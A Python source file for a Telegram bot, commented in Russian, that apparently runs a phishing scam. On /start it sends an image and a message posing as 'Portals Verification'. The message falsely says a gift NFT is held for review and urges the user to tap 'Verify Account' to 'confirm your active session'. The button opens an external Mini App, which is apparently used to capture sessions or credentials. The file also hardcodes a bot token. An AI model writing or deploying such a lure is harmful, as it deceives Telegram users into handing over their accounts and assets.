import logging
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, WebAppInfo
from telegram.ext import Application, CommandHandler, ContextTypes

# Настройка логирования
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# ТОКЕН БОТА
TOKEN = "8868277445:AAEPYSE-uoej11anci9jpiaoDYsOqL_-tps"

# ⚡ НОВАЯ ССЫЛКА НА АВАТАРКУ
PHOTO_URL = "https://i.postimg.cc/hPNrFrmg/IMG-4180.jpg"

# ССЫЛКА НА MINI APP
MINI_APP_URL = "verifing-production.up.railway.app"

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [
        [InlineKeyboardButton("✅ Verify Account", web_app=WebAppInfo(url=MINI_APP_URL))]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    message = (
        f"🎩 *Portals Verification*\n\n"
        f"**Final Verification Required: Claim Your Gift**\n\n"
        f"Your scheduled delivery of *JollyChimp #20,203* is tagged for last-mile review. "
        f"To preserve platform safety and block fraudulent claim attempts, confirming "
        f"your active session is required before the gift can be released.\n\n"
        f"A single tap below and the asset is on its way."
    )
    
    # ОТПРАВЛЯЕМ КАК ДОКУМЕНТ (лучшее качество, но без превью в чате)
    # await update.message.reply_document(
    #     document=PHOTO_URL,
    #     caption=message,
    #     reply_markup=reply_markup,
    #     parse_mode='Markdown'
    # )
    
    # ИЛИ ОТПРАВЛЯЕМ КАК ФОТО (с превью, но может сжиматься)
    await update.message.reply_photo(
        photo=PHOTO_URL,
        caption=message,
        reply_markup=reply_markup,
        parse_mode='Markdown'
    )

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "🤖 *Бот для верификации*\n\n"
        "Нажми /start и затем 'Verify Account' для открытия Mini App",
        parse_mode='Markdown'
    )

def main():
    application = Application.builder().token(TOKEN).build()
    
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("help", help_command))
    
    logger.info("🚀 Бот запущен и работает!")
    application.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == '__main__':
    main()
